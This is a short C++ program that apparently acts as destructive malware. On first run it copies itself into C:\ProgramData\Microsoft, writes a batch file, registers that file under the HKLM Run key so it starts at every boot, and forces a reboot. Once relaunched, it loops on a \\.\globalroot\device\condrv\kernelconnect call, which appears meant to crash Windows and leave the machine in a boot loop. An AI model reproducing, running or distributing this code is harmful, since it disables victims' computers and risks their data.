#include <iostream>

using namespace std;

int main(int argc, char** argv)
{
    string addd = argv[0];
    if (argc == 1)
    {
        string v = "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Lovelyblue /t REG_SZ /d C:\\ProgramData\\Microsoft\\runblue.bat /f";
        string s = "echo C:\\ProgramData\\Microsoft\\blue.exe -run > C:\\ProgramData\\Microsoft\\runblue.bat";
        string c = "copy " + addd + " C:\\ProgramData\\Microsoft";
        system(c.c_str());
        system(s.c_str());
        system(v.c_str());
        system("shutdown -r -f -t 0");
    }
    else {
        while (true)
            system("\\\\.\\globalroot\\device\\condrv\\kernelconnect");
    }
    return 0;
}